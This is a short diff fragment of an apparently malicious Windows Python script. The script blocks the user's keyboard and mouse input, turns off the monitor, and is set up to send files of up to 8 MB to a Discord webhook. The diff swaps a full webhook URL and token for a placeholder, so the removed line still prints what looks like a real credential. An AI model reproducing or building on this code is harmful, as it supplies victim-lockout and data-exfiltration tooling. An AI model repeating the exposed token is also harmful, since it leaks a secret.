@@ -10,7 +10,7 @@ ctypes.windll.user32.BlockInput(True)
 ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)
 
 # Replace with your Discord webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/1116644587738497074/xW4tlKgSbjoyUQBCWF3eiETbxNBTz7_t7UEOyqnuJ-1irTx3yyNArxdCJrtP3OCzuA9R"
+WEBHOOK_URL = "insert URL here"
 
 MAX_FILE_SIZE_MB = 8
 
